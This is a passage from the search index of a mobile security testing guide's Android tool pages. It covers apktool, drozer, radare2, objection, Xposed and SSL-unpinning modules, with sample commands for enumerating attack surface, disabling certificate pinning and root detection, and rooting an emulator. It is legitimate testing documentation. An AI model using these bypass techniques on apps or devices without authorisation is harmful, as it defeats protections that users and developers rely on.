APKLab's official documentation.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0011/","title":"MASTG-TOOL-0011: Apktool","text":"<p> Apktool is used to unpack Android app packages (APKs). Simply unzipping APKs with the standard <code>unzip</code> utility leaves some files unreadable. <code>AndroidManifest.xml</code> is encoded into binary XML format which isn't readable with a text editor. Also, the app resources are still packaged into a single archive file.</p> <p>When run with default command line flags, apktool automatically decodes the Android Manifest file to text-based XML format and extracts the file resources (it also disassembles the .DEX files to smali code - a feature that we'll revisit later in this book).</p> <p>Among the unpacked files you can usually find (after running <code>apktool d base.apk</code>):</p> <ul> <li>AndroidManifest.xml: The decoded Android Manifest file, which can be opened and edited in a text editor.</li> <li>apktool.yml: file containing information about the output of apktool</li> <li>original: folder containing the MANIFEST.MF file, which contains information about the files contained in the JAR file</li> <li>res: directory containing the app's resources</li> <li>smali: directory containing the disassembled Dalvik bytecode.</li> </ul> <p>You can also use apktool to repackage decoded resources back to binary APK/JAR. See the techniques  Exploring the App Package and  Repackaging &amp; Re-Signing for more information and practical examples.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0012/","title":"MASTG-TOOL-0012: apkx","text":"<p>  apkx is a Python wrapper to popular free DEX converters and Java decompilers. It automates the extraction, conversion, and decompilation of APKs. Install it as follows:</p> <pre><code>git clone https://github.com/muellerberndt/apkx\ncd apkx\nsudo ./install.sh\n</code></pre> <p>This should copy apkx to <code>/usr/local/bin</code>.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0013/","title":"MASTG-TOOL-0013: Busybox","text":"<p>Busybox combines multiple common Unix utilities into a small single executable. The utilities included generally have fewer options than their full-featured GNU counterparts, but are sufficient enough to provide a complete environment on a small or embedded system. Busybox can be installed on a rooted device by downloading the Busybox application from Google Play Store. You can also download the binary directly from the Busybox website. Once downloaded, make an <code>adb push busybox /data/local/tmp</code> to have the executable available on your phone. A quick overview of how to install and use Busybox can be found in the Busybox FAQ.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0014/","title":"MASTG-TOOL-0014: Bytecode Viewer","text":"<p>Bytecode Viewer (BCV) is a free and open source Java decompiler framework running on all operating systems. It is a versatile tool which can be used to decompile Android apps, view APK resources (via apktool) and easily edit APKs (via Smali/Baksmali). Apart from APKs, also DEX, Java Class files and Java Jars can be viewed. One of its major features is the support for multiple Java bytecode decompilers under one GUI. BCV currently includes the Procyon, CFR, Fernflower, Krakatau, and JADX-Core decompilers. These decompilers have different strengths and can be easily leveraged while using BCV, especially when dealing with obfuscated programs.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0015/","title":"MASTG-TOOL-0015: drozer","text":"<p> drozer is a security testing framework for Android that allows you to search for security vulnerabilities in apps and devices by assuming the role of an app interacting with the Android runtime, other apps' IPC endpoints, and the underlying OS.</p> <p>drozer can be used during Android security assessments to automate tasks. It allows testers and reverse engineers to:</p> <ul> <li>Discover and interact with the attack surface exposed by Android apps.</li> <li>Execute dynamic Java-code on a device, to avoid the need to compile and install small test scripts.</li> </ul> <p>drozer runs both in Android emulators and on real devices. It does not require USB debugging or other development features to be enabled; so you can perform assessments on devices in their production state to simulate attacks.</p> <p>You can extend drozer with additional modules to find, test and exploit other weaknesses; this, combined with scripting possibilities, helps to automate regression testing for security issues.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0015/#installing-drozer-and-setup","title":"Installing drozer and Setup","text":"<p>Detailed instructions on how to install and set up the drozer console on your machine and the drozer agent on the Android phone can be found in the drozer Github repo.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0015/#example-usage","title":"Example usage","text":"<p>Once drozer is set up, you can use drozer to perform reconnaissance and exploitation of Android applications from the perspective of a malicious app on the device. The drozer User Manual introduces an intentionally vulnerable application - sieve - together with step-by-step exploitation instructions.</p> <p>Some common drozer commands include:</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0015/#searching-for-applications-on-the-device","title":"Searching for applications on the device","text":"<pre><code>run app.package.list -f &lt;keyword&gt;\n</code></pre> <p>This lists basic information about any packages containing the word \"\" in their bundle identifier. This includes package names, key directories used by the application, and any permissions used or defined by the application.","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0015/#enumerating-the-attack-surface-of-an-app","title":"Enumerating the attack surface of an app","text":"<pre><code>run app.package.attacksurface &lt;package&gt;\n</code></pre> <p>This command inspects the target app's manifest and provides a report on any exported components of the application, and verifies whether the application is debuggable.</p> <p>Once the attack surface has been identified, you can obtain more specific information about each component class. For example, to list Activities, you can use the following command:</p> <pre><code>run app.activity.info -a &lt;package&gt;\n</code></pre> <p>This lists the names of all exported Activities, together with the permissions required to interact with them.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0015/#starting-an-activity","title":"Starting an Activity","text":"<p>In order to launch an exported activity, use the following command:</p> <pre><code>run app.activity.start --component &lt;package&gt; &lt;component name&gt;\n</code></pre> <p>When calling <code>app.activity.start</code>, you can build a much more complex intent. As with all drozer modules, you can request more usage information by using the <code>help</code> command:</p> <pre><code>dz&gt; help app.activity.start\nAttempting to run shell module\nusage: run app.activity.start [-h] [--action ACTION] [--category CATEGORY [CATEGORY ...]] [--component PACKAGE COMPONENT] [--data-uri DATA_URI] [--extra TYPE KEY VALUE] [--flags FLAGS [FLAGS ...]] [--mimetype MIMETYPE]\n</code></pre> <p>You can learn more about how intents are created by running <code>help intents</code>.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0015/#other-drozer-resources","title":"Other drozer resources","text":"<p>Other resources where you might find useful information are:</p> <ul> <li>Official drozer User Manual</li> <li>drozer GitHub page</li> <li>drozer Agent GitHub page</li> </ul>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0016/","title":"MASTG-TOOL-0016: gplaycli","text":"<p> gplaycli is a Python based CLI tool to search, install and update Android applications from the Google Play Store. Follow the installation steps and you're ready to run it. gplaycli offers several options, please refer to its help (<code>-h</code>) for more information.</p> <p>If you're unsure about the package name (or AppID) of an app, you may perform a keyword based search for APKs (<code>-s</code>):</p> <pre><code>$ gplaycli -s \"google keep\"\n\nTitle                          Creator     Size      Last Update  AppID                                    Version\n\nGoogle Keep - notes and lists  Google LLC  15.78MB   4 Sep 2019   com.google.android.keep                  193510330\nMaps - Navigate &amp; Explore      Google LLC  35.25MB   16 May 2019  com.google.android.apps.maps             1016200134\nGoogle                         Google LLC  82.57MB   30 Aug 2019  com.google.android.googlequicksearchbox  301008048\n</code></pre> <p>Note that regional (Google Play) restrictions apply when using gplaycli. In order to access apps that are restricted in your country you can use alternative app stores such as the ones described in  Obtaining and Extracting Apps.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0017/","title":"MASTG-TOOL-0017: House","text":"<p> House is a runtime mobile application analysis toolkit for Android apps, developed and maintained by the NCC Group and is written in Python.</p> <p>It's leveraging a running Frida server on a rooted device or the Frida gadget in a repackaged Android app. The intention of House is to allow an easy way of prototyping Frida scripts via its convenient web GUI.</p> <p>The installation instructions and \"how-to guide\" of House can be found in the Readme of the Github repo.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0018/","title":"MASTG-TOOL-0018: jadx","text":"<p>  Jadx is an open-source Dex and Java decompiler available both in a CLI (<code>jadx</code>) and GUI (<code>jadx-gui</code>) form. It's actively developed and offers an extensive range of features to help you analyze Android applications:</p> <ul> <li>Decoding of resources and Manifest</li> <li>Refactoring of symbols</li> <li>Finding cross-references</li> <li>Search features for classes, symbols, resources and code</li> <li>An API for creating custom extensions</li> <li>Support for debugging applications</li> <li>Generation of  Frida and  Xposed snippets</li> </ul> <p></p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0019/","title":"MASTG-TOOL-0019: jdb","text":"<p>A Java Debugger which allows to set breakpoints and print application variables. jdb uses the JDWP protocol - https://docs.oracle.com/javase/7/docs/technotes/tools/windows/jdb.html</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0020/","title":"MASTG-TOOL-0020: JustTrustMe","text":"<p>  An Xposed Module to bypass SSL certificate pinning - https://github.com/Fuzion24/JustTrustMe</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0021/","title":"MASTG-TOOL-0021: Magisk","text":"<p><code>Magisk</code> (\"Magic Mask\") is one way to root your Android device. It's specialty lies in the way the modifications on the system are performed. While other rooting tools alter the actual data on the system partition, Magisk does not (which is called \"systemless\"). This enables a way to hide the modifications from root-sensitive applications (e.g. for banking or games) and allows using the official Android OTA upgrades without the need to unroot the device beforehand.</p> <p>You can get familiar with Magisk reading the official documentation on GitHub. If you don't have Magisk installed, you can find installation instructions in the documentation. If you use an official Android version and plan to upgrade it, Magisk provides a tutorial on GitHub.</p> <p>Learn more about rooting your device with Magisk.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0022/","title":"MASTG-TOOL-0022: Proguard","text":"<p>ProGuard is a free Java class file shrinker, optimizer, obfuscator, and preverifier. It detects and removes unused classes, fields, methods, and attributes and can also be used to delete logging-related code.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0023/","title":"MASTG-TOOL-0023: RootCloak Plus","text":"<p>Deprecated Tool</p> <p>This tool is deprecated and should not be used anymore.</p> <p>Reason: The tool is no longer relevant or was replaced by other tools.</p> <p>Use instead:</p> <ul> <li> Choicy</li> </ul> <p>  A Cydia Substrate Module used to check for commonly known indications of root - https://github.com/devadvance/rootcloakplus</p>","tags":["android","tool","deprecated"]},{"location":"MASTG/tools/android/MASTG-TOOL-0024/","title":"MASTG-TOOL-0024: Scrcpy","text":"<p> Scrcpy provides display and control of Android devices connected over USB (or TCP/IP). It does not require any root access and it works on GNU/Linux, Windows and macOS.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0025/","title":"MASTG-TOOL-0025: SSLUnpinning","text":"<p>  An Xposed Module to bypass SSL certificate pinning - https://github.com/ac-pm/SSLUnpinning_Xposed</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0026/","title":"MASTG-TOOL-0026: Termux","text":"<p>Termux is a terminal emulator for Android that provides a Linux environment that works directly with or without rooting and with no setup required. The installation of additional packages is a trivial task thanks to its own APT package manager (which makes a difference in comparison to other terminal emulator apps). You can search for specific packages by using the command <code>pkg search &lt;pkg_name&gt;</code> and install packages with <code>pkg install &lt;pkg_name&gt;</code>. You can install Termux straight from Google Play.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0027/","title":"MASTG-TOOL-0027: Xposed","text":"<p>Xposed does not work on Android 9 (API level 28). However, it was unofficially ported in 2019 under the name EdXposed, supporting Android 8-10 (API level 26 till 29). You can find the code and usage examples at EdXposed Github repo.</p> <p>Xposed is a framework that allows to modify the system or application aspect and behavior at runtime, without modifying any Android application package (APK) or re-flashing. Technically, it is an extended version of Zygote that exports APIs for running Java code when a new process is started. Running Java code in the context of the newly instantiated app makes it possible to resolve, hook, and override Java methods belonging to the app. Xposed uses reflection to examine and modify the running app. Changes are applied in memory and persist only during the process' runtime since the application binaries are not modified.</p> <p>To use Xposed, you need to first install the Xposed framework on a rooted device as explained on XDA-Developers Xposed framework hub. Modules can be installed through the Xposed Installer app, and they can be toggled on and off through the GUI.</p> <p>Note: given that a plain installation of the Xposed framework is easily detected with SafetyNet, we recommend using Magisk to install Xposed. This way, applications with SafetyNet attestation should have a higher chance of being testable with Xposed modules.</p> <p>Xposed has been compared to Frida. When you run Frida server on a rooted device, you will end up with a similarly effective setup. Both frameworks deliver a lot of value when you want to do dynamic instrumentation. When Frida crashes the app, you can try something similar with Xposed. Next, similar to the abundance of Frida scripts, you can easily use one of the many modules that come with Xposed, such as the earlier discussed module to bypass SSL pinning (JustTrustMe and SSLUnpinning). Xposed includes other modules, such as Inspeckage which allow you to do more in depth application testing as well. On top of that, you can create your own modules as well to patch often used security mechanisms of Android applications.</p> <p>Xposed can also be installed on an emulator through the following script:</p> <pre><code>#!/bin/sh\necho \"Start your emulator with 'emulator -avd NAMEOFX86A8.0 -writable-system -selinux permissive -wipe-data'\"\nadb root &amp;&amp; adb remount\nadb install SuperSU\\ v2.79.apk #binary can be downloaded from http://www.supersu.com/download\nadb push root_avd-master/SuperSU/x86/su /system/xbin/su\nadb shell chmod 0755 /system/xbin/su\nadb shell setenforce 0\nadb shell su --install\nadb shell su --daemon&amp;\nadb push busybox /data/busybox #binary can be downloaded from https://busybox.net/\n# adb shell \"mount -o remount,rw /system &amp;&amp; mv /data/busybox /system/bin/busybox &amp;&amp; chmod 755 /system/bin/busybox &amp;&amp; /system/bin/busybox --install /system/bin\"\nadb shell chmod 755 /data/busybox\nadb shell 'sh -c \"./data/busybox --install /data\"'\nadb shell 'sh -c \"mkdir /data/xposed\"'\nadb push xposed8.zip /data/xposed/xposed.zip #can be downloaded from https://dl-xda.xposed.info/framework/\nadb shell chmod 0755 /data/xposed\nadb shell 'sh -c \"./data/unzip /data/xposed/xposed.zip -d /data/xposed/\"'\nadb shell 'sh -c \"cp /data/xposed/xposed/META-INF/com/google/android/*.* /data/xposed/xposed/\"'\necho \"Now adb shell and do 'su', next: go to ./data/xposed/xposed, make flash-script.sh executable and run it in that directory after running SUperSU\"\necho \"Next, restart emulator\"\necho \"Next, adb install XposedInstaller_3.1.5.apk\"\necho \"Next, run installer and then adb reboot\"\necho \"Want to use it again? Start your emulator with 'emulator -avd NAMEOFX86A8.0 -writable-system -selinux permissive'\"\n</code></pre>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0028/","title":"MASTG-TOOL-0028: radare2 for Android","text":"<p> radare2 (r2) is a popular open source reverse engineering framework for disassembling, debugging, patching and analyzing binaries that is scriptable and supports many architectures and file formats including Android and iOS apps. For Android, Dalvik DEX (odex, multidex), ELF (executables, .so, ART) and Java (JNI and Java classes) are supported. It also contains several useful scripts that can help you during mobile application analysis as it offers low level disassembling and safe static analysis that comes in handy when traditional tools fail.</p> <p>radare2 implements a rich command line interface (CLI) where you can perform the mentioned tasks. However, if you're not really comfortable using the CLI for reverse engineering you may want to consider using the Web UI (via the <code>-H</code> flag) or the even more convenient Qt and C++ GUI version called iaito. Do keep in mind that the CLI, and more concretely its Visual Mode and its scripting capabilities (r2pipe), are the core of radare2's power and it's definitely worth learning how to use it.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0028/#installing-radare2","title":"Installing radare2","text":"<p>Please refer to radare2's official installation instructions. We highly recommend to always install radare2 from the GitHub version instead of via common package managers such as APT. Radare2 is in very active development, which means that third party repositories are often outdated.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0028/#using-radare2","title":"Using radare2","text":"<p>The radare2 framework comprises a set of small utilities that can be used from the r2 shell or independently as CLI tools. These utilities include <code>rabin2</code>, <code>rasm2</code>, <code>rahash2</code>, <code>radiff2</code>, <code>rafind2</code>, <code>ragg2</code>, <code>rarun2</code>, <code>rax2</code>, and of course <code>r2</code>, which is the main one.</p> <p>For example, you can use <code>rafind2</code> to read strings directly from an encoded Android Manifest (AndroidManifest.xml):</p> <pre><code># Permissions\n$ rafind2 -ZS permission AndroidManifest.xml\n# Activities\n$ rafind2 -ZS activity AndroidManifest.xml\n# Content providers\n$ rafind2 -ZS provider AndroidManifest.xml\n# Services\n$ rafind2 -ZS service AndroidManifest.xml\n# Receivers\n$ rafind2 -ZS receiver AndroidManifest.xml\n</code></pre> <p>Or use  rabin2 to get information about a binary file.</p> <p>Use the main <code>r2</code> utility to access the r2 shell. You can load DEX binaries just like any other binary:</p> <pre><code>r2 classes.dex\n</code></pre> <p>Enter <code>r2 -h</code> to see all available options. A very commonly used flag is <code>-A</code>, which triggers an analysis after loading the target binary. However, this should be used sparingly and with small binaries as it is very time and resource consuming. You can learn more about this in  Disassembling Native Code.</p> <p>Once in the r2 shell, you can also access functions offered by the other radare2 utilities. For example, running <code>i</code> will print the information of the binary, exactly as <code>rabin2 -I</code> does.</p> <p>To print all the strings use <code>rabin2 -Z</code> or the command <code>iz</code> (or the less verbose <code>izq</code>) from the r2 shell.</p> <pre><code>[0x000009c8]&gt; izq\n0xc50 39 39 /dev/com.koushikdutta.superuser.daemon/\n0xc79 25 25 /system/app/Superuser.apk\n...\n0xd23 44 44 5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=\n0xd51 32 32 8d127684cbc37c17616d806cf50473cc\n0xd76 6 6 &lt;init&gt;\n0xd83 10 10 AES error:\n0xd8f 20 20 AES/ECB/PKCS7Padding\n0xda5 18 18 App is debuggable!\n0xdc0 9 9 CodeCheck\n0x11ac 7 7 Nope...\n0x11bf 14 14 Root detected!\n</code></pre> <p>Most of the time you can append special options to your commands such as <code>q</code> to make the command less verbose (quiet) or <code>j</code> to give the output in JSON format (use <code>~{}</code> to prettify the JSON string).</p> <pre><code>[0x000009c8]&gt; izj~{}\n[\n  {\n    \"vaddr\": 3152,\n    \"paddr\": 3152,\n    \"ordinal\": 1,\n    \"size\": 39,\n    \"length\": 39,\n    \"section\": \"file\",\n    \"type\": \"ascii\",\n    \"string\": \"L2Rldi9jb20ua291c2hpa2R1dHRhLnN1cGVydXNlci5kYWVtb24v\"\n  },\n  {\n    \"vaddr\": 3193,\n    \"paddr\": 3193,\n    \"ordinal\": 2,\n    \"size\": 25,\n    \"length\": 25,\n    \"section\": \"file\",\n    \"type\": \"ascii\",\n    \"string\": \"L3N5c3RlbS9hcHAvU3VwZXJ1c2VyLmFwaw==\"\n  },\n</code></pre> <p>You can print the class names and their methods with the r2 command <code>ic</code> (information classes).</p> <pre><code>[0x000009c8]&gt; ic\n...\n0x0000073c [0x00000958 - 0x00000abc]    356 class 5 Lsg/vantagepoint/uncrackable1/MainActivity\n:: Landroid/app/Activity;\n0x00000958 method 0 pC   Lsg/vantagepoint/uncrackable1/MainActivity.method.&lt;init&gt;()V\n0x00000970 method 1 P    Lsg/vantagepoint/uncrackable1/MainActivity.method.a(Ljava/lang/String;)V\n0x000009c8 method 2 r    Lsg/vantagepoint/uncrackable1/MainActivity.method.onCreate (Landroid/os/Bundle;)V\n0x00000a38 method 3 p    Lsg/vantagepoint/uncrackable1/MainActivity.method.verify (Landroid/view/View;)V\n0x0000075c [0x00000acc - 0x00000bb2]    230 class 6 Lsg/vantagepoint/uncrackable1/a :: Ljava/lang/Object;\n0x00000acc method 0 sp   Lsg/vantagepoint/uncrackable1/a.method.a(Ljava/lang/String;)Z\n0x00000b5c method 1 sp   Lsg/vantagepoint/uncrackable1/a.method.b(Ljava/lang/String;)[B\n</code></pre> <p>You can print the imported methods with the r2 command <code>ii</code> (information imports).</p> <pre><code>[0x000009c8]&gt; ii\n[Imports]\nNum  Vaddr       Bind      Type Name\n...\n  29 0x000005cc    NONE    FUNC Ljava/lang/StringBuilder.method.append(Ljava/lang/String;) Ljava/lang/StringBuilder;\n  30 0x000005d4    NONE    FUNC Ljava/lang/StringBuilder.method.toString()Ljava/lang/String;\n  31 0x000005dc    NONE    FUNC Ljava/lang/System.method.exit(I)V\n  32 0x000005e4    NONE    FUNC Ljava/lang/System.method.getenv(Ljava/lang/String;)Ljava/lang/String;\n  33 0x000005ec    NONE    FUNC Ljavax/crypto/Cipher.method.doFinal([B)[B\n  34 0x000005f4    NONE    FUNC Ljavax/crypto/Cipher.method.getInstance(Ljava/lang/String;) Ljavax/crypto/Cipher;\n  35 0x000005fc    NONE    FUNC Ljavax/crypto/Cipher.method.init(ILjava/security/Key;)V\n  36 0x00000604    NONE    FUNC Ljavax/crypto/spec/SecretKeySpec.method.&lt;init&gt;([BLjava/lang/String;)V\n</code></pre> <p>A common approach when inspecting a binary is to search for something, navigate to it and visualize it in order to interpret the code. One of the ways to find something using radare2 is by filtering the output of specific commands, i.e. to grep them using <code>~</code> plus a keyword (<code>~+</code> for case-insensitive). For example, we might know that the app is verifying something, we can inspect all radare2 flags and see where we find something related to \"verify\".</p> <p>When loading a file, radare2 tags everything it's able to find. These tagged names or references are called flags. You can access them via the command <code>f</code>.</p> <p>In this case we will grep the flags using the keyword \"verify\":</p> <pre><code>[0x000009c8]&gt; f~+verify\n0x00000a38 132 sym.Lsg_vantagepoint_uncrackable1_MainActivity.method. \\\nverify_Landroid_view_View__V\n0x00000a38 132 method.public.Lsg_vantagepoint_uncrackable1_MainActivity. \\\nLsg_vantagepoint_uncrackable1\n        _MainActivity.method.verify_Landroid_view_View__V\n0x00001400 6 str.verify\n</code></pre> <p>It seems that we've found one method in 0x00000a38 (that was tagged two times) and one string in 0x00001400. Let's navigate (seek) to that method by using its flag:</p> <pre><code>[0x000009c8]&gt; s sym.Lsg_vantagepoint_uncrackable1_MainActivity.method. \\\nverify_Landroid_view_View__V\n</code></pre> <p>And of course you can also use the disassembler capabilities of r2 and print the disassembly with the command <code>pd</code> (or <code>pdf</code> if you know you're already located in a function).</p> <pre><code>[0x00000a38]&gt; pd\n</code></pre> <p>r2 commands normally accept options (see <code>pd?</code>), e.g. you can limit the opcodes displayed by appending a number (\"N\") to the command <code>pd N</code>.</p> <p></p> <p>Instead of just printing the disassembly to the console you may want to enter the so-called Visual Mode by typing <code>V</code>.</p> <p></p> <p>By default, you will see the hexadecimal view. By typing <code>p</code> you can switch to different views, such as the disassembly view:</p> <p></p> <p>Radare2 offers a Graph Mode that is very useful to follow the flow of the code. You can access it from the Visual Mode by typing <code>V</code>:</p> <p></p> <p>This is only a selection of some radare2 commands to start getting some basic information from Android binaries. Radare2 is very powerful and has dozens of commands that you can find on the radare2 command documentation. Radare2 will be used throughout the guide for different purposes such as reversing code, debugging or performing binary analysis. We will also use it in combination with other frameworks, especially Frida (see the r2frida section for more information).</p> <p>Please refer to  Disassembling Native Code for more detailed use of radare2 on Android, especially when analyzing native libraries. You may also want to read the official radare2 book.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0029/","title":"MASTG-TOOL-0029: objection for Android","text":"<p>  Objection offers several features specific to Android. You can find the full list of features on the project's page, but here are a few interesting ones:</p> <ul> <li>Repackage applications to include the Frida gadget</li> <li>Disable SSL pinning for popular methods</li> <li>Access application storage to download or upload files</li> <li>Execute custom Frida scripts</li> <li>List the Activities, Services and Broadcast receivers</li> <li>Start Activities</li> </ul> <p>If you have a rooted device with frida-server installed, Objection can connect directly to the running Frida server to provide all its functionality without needing to repackage the application. However, it is not always possible to root an Android device or the app may contain advanced RASP controls for root detection, so injecting a frida-gadget may be the easiest way to bypass those controls.</p> <p>The ability to perform advanced dynamic analysis on non-rooted devices is one of the features that makes Objection incredibly useful. After following the repackaging process ( Repackaging &amp; Re-Signing) you will be able to run all the aforementioned commands which make it very easy to quickly analyze an application, or bypass basic security controls.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0029/#using-objection-on-android","title":"Using Objection on Android","text":"<p>Starting up Objection depends on whether you've patched the APK or whether you are using a rooted device running Frida-server. For running a patched APK, objection will automatically find any attached devices and search for a listening Frida gadget. However, when using frida-server, you need to explicitly tell frida-server which application you want to analyze.</p> <pre><code># Connecting to a patched APK\nobjection explore\n\n# Find the correct name using frida-ps\n$ frida-ps -Ua | grep -i telegram\n30268  Telegram                               org.telegram.messenger\n\n# Connecting to the Telegram app through Frida-server\n$ objection --gadget=\"org.telegram.messenger\" explore\n</code></pre> <p>Once you are in the Objection REPL, you can execute any of the available commands. Below is an overview of some of the most useful ones:</p> <pre><code># Show the different storage locations belonging to the app\n$ env\n\n# Disable popular ssl pinning methods\n$ android sslpinning disable\n\n# List items in the keystore\n$ android keystore list\n\n# Try to circumvent root detection\n$ android root disable\n</code></pre> <p>More information on using the Objection REPL can be found on the Objection Wiki</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0030/","title":"MASTG-TOOL-0030: Angr","text":"<p>Angr is a Python framework for analyzing binaries. It is useful for both static and dynamic symbolic (\"concolic\") analysis. In other words: given a binary and a requested state, Angr will try to get to that state, using formal methods (a technique used for static code analysis) to find a path, as well as brute forcing. Using angr to get to the requested state is often much faster than taking manual steps for debugging and searching the path towards the required state. Angr operates on the VEX intermediate language and comes with a loader for ELF/ARM binaries, so it is perfect for dealing with native code, such as native Android binaries.</p> <p>Angr allows for disassembly, program instrumentation, symbolic execution, control-flow analysis, data-dependency analysis, decompilation and more, given a large set of plugins.</p> <p>Since version 8, Angr is based on Python 3, and can be installed with pip on *nix operating systems, macOS and Windows:</p> <pre><code>pip install angr\n</code></pre> <p>Some of angr's dependencies contain forked versions of the Python modules Z3 and PyVEX, which would overwrite the original versions. If you're using those modules for anything else, you should create a dedicated virtual environment with Virtualenv. Alternatively, you can always use the provided docker container. See the installation guide for more details.</p> <p>Comprehensive documentation, including an installation guide, tutorials, and usage examples are available on Angr's Gitbooks page. A complete API reference is also available.</p> <p>You can use angr from a Python REPL - such as iPython - or script your approaches. Although angr has a bit of a steep learning curve, we do recommend using it when you want to brute force your way to a given state of an executable. Please refer to  Symbolic Execution as a great example on how this can work.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0099/","title":"MASTG-TOOL-0099: FlowDroid","text":"<p> FlowDroid is an open-source tool based in soot, a framework dedicated to analyzing and translating Java bytecode for easier analysis. The tool handles the nuances of Android app lifecycles (like <code>onCreate</code>, <code>onStart</code>, <code>onPause</code>, and others) and its UI components during analysis and performs taint analysis that is:</p> <ul> <li>Context-sensitive: Distinguishing between calls to the same method based on their specific execution contexts.</li> <li>Object-sensitive: Identifying individual objects, even when they're of the same class.</li> <li>Flow-sensitive: Recognizing the sequential order of code execution.</li> </ul> <p>FlowDroid can be used in two ways: as a standalone command line tool for quick analyses or as a library for more complex investigations. In addition to performing taint analysis, FlowDroid can also generate call graphs, as illustrated in this blog post.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0103/","title":"MASTG-TOOL-0103: uber-apk-signer","text":"<p>  A tool that helps to sign, zip align and verify one or more Android application packages (APKs) with either debug or provided release certificates. It supports v1, v2, v3 and v4 Android signing schemes. Easy and convenient debug signing with embedded debug keystore. Automatically verifies signature and zip alignment after signing.</p> <p>Download the jar from the latest release and run:</p> <pre><code>$ java -jar uber-apk-signer.jar --apks &lt;/path/to/apks&gt;\n</code></pre> <p>Demo:</p> <p></p> <p>For more information go to the GitHub repository.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0107/","title":"MASTG-TOOL-0107: JNITrace","text":"<p>  A Frida based tool to trace use of the JNI API in Android apps.</p> <p>Native libraries contained within Android Apps often make use of the JNI API to utilize the Android Runtime. Tracking those calls through manual reverse engineering can be a slow and painful process. jnitrace works as a dynamic analysis tracing tool similar to frida-trace or strace but for the JNI.</p> <p></p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0112/","title":"MASTG-TOOL-0112: pidcat","text":"<p>  The Pidcat tool acts as a wrapper for <code>adb logcat</code> that allows you to view Android log entries for specific application packages in a visually distinct color format.</p> <p></p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0116/","title":"MASTG-TOOL-0116: Blutter","text":"<p> Blutter is an open-source tool created to support the reverse engineering of Flutter applications. Unlike other Flutter tools, Blutter parses the libapp.so file statically, without requiring you to run the app on a device. Blutter can:</p> <ul> <li>Extract and analyze Dart objects</li> <li>Provide annotations for instructions, including function names or pool objects where applicable</li> <li>Generate Frida scripts for further analysis</li> </ul> <p>This tool requires a specific environment to function, which is explained in the setup instructions. Alternatively, a convenient Docker file can be found in a PR.</p> <p>More information is available in the B(l)utter \u2013 Reversing Flutter Applications presentation.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0120/","title":"MASTG-TOOL-0120: ProxyDroid","text":"<p>  ProxyDroid is an open source app available in Google Play that configures your device to send HTTP(S) traffic to a proxy. It is especially useful for apps that ignore the system's proxy settings, as it uses <code>iptables</code> to force the traffic to your proxy.</p> <p>Due to the usage of <code>iptables</code>, there are a few limitations to consider:</p> <ul> <li>ProxyDroid only works on rooted devices</li> <li>Only port 80, 443 and 5228 are intercepted</li> <li>The proxy needs to be configured in transparent proxy mode</li> </ul>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0123/","title":"MASTG-TOOL-0123: apksigner","text":"<p>apksigner, available in revision 24.0.3 and higher of the Android SDK Build Tools, is contained in the  Android SDK at <code>[SDK-Path]/build-tools/[version]/apksigner</code> and can be used to verify APK signatures, rotate keys and display additional information about the signing certificates and keys.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0124/","title":"MASTG-TOOL-0124: aapt2","text":"<p>aapt2, available in Android SDK Build Tools since revision 26.0.2, is contained in the  Android SDK at <code>[SDK-Path]/build-tools/[version]/aapt2</code> and can be used, for example, to examine the contents of the AndroidManifest file.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0125/","title":"MASTG-TOOL-0125: Apkleaks","text":"<p> Apkleaks is an open-source utility designed for static analysis of Android APK files, with a primary focus on identifying sensitive data such as API keys, URLs, AWS S3 buckets, and Firebase URLs. This tool automates the process of string analysis, facilitating the detection of hardcoded secrets and potential security vulnerabilities.</p> <p>It offers support for custom regular expression rules, enabling users to specify additional search criteria through a JSON configuration file regexes.json.</p>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0130/","title":"MASTG-TOOL-0130: blint","text":"<p> BLint is a Binary Linter that checks the security properties and capabilities of an 